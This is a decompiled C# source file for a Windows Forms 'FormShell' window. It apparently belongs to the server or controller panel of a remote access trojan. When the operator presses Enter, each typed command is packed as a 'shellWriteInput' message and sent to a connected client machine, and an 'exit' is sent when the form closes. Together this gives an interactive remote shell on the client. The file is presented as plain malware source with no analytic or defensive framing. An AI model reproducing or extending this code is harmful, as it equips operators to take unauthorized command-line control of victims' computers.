using System;
using System.ComponentModel;
using System.Drawing;
using System.Threading;
using System.Windows.Forms;
using Server.Connection;
using Server.MessagePack;

namespace Server.Forms
{
	// Token: 0x02000096 RID: 150
	public partial class FormShell : Form
	{
		// Token: 0x170000D2 RID: 210
		// (get) Token: 0x0600042C RID: 1068 RVA: 0x00004405 File Offset: 0x00002605
		// (set) Token: 0x0600042D RID: 1069 RVA: 0x0000440D File Offset: 0x0000260D
		public Form1 F { get; set; }

		// Token: 0x170000D3 RID: 211
		// (get) Token: 0x0600042E RID: 1070 RVA: 0x00004416 File Offset: 0x00002616
		// (set) Token: 0x0600042F RID: 1071 RVA: 0x0000441E File Offset: 0x0000261E
		internal Clients Client { get; set; }

		// Token: 0x06000430 RID: 1072 RVA: 0x00004427 File Offset: 0x00002627
		public FormShell()
		{
			this.InitializeComponent();
			this.textBox1.Focus();
			this.textBox1.Select();
		}

		// Token: 0x06000431 RID: 1073 RVA: 0x00033B80 File Offset: 0x00031D80
		private void TextBox1_KeyDown(object sender, KeyEventArgs e)
		{
			if (this.Client != null && e.KeyData == Keys.Return && !string.IsNullOrWhiteSpace(this.textBox1.Text))
			{
				if (this.textBox1.Text == "cls".ToLower())
				{
					this.richTextBox1.Clear();
					this.textBox1.Clear();
				}
				if (this.textBox1.Text == "exit".ToLower())
				{
					base.Close();
				}
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "shellWriteInput";
				msgPack.ForcePathObject("WriteInput").AsString = this.textBox1.Text;
				ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
				this.textBox1.Clear();
			}
		}

		// Token: 0x06000432 RID: 1074 RVA: 0x00033C6C File Offset: 0x00031E6C
		private void FormShell_FormClosed(object sender, FormClosedEventArgs e)
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Packet").AsString = "shellWriteInput";
			msgPack.ForcePathObject("WriteInput").AsString = "exit";
			ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
		}

		// Token: 0x06000433 RID: 1075 RVA: 0x00033CC8 File Offset: 0x00031EC8
		private void Timer1_Tick(object sender, EventArgs e)
		{
			try
			{
				if (!this.Client.TcpClient.Connected)
				{
					base.Close();
				}
			}
			catch
			{
				base.Close();
			}
		}

		// Token: 0x06000434 RID: 1076 RVA: 0x00002287 File Offset: 0x00000487
		private void FormShell_Load(object sender, EventArgs e)
		{
		}

		// Token: 0x06000435 RID: 1077 RVA: 0x00002287 File Offset: 0x00000487
		private void textBox1_TextChanged(object sender, EventArgs e)
		{
		}
	}
}
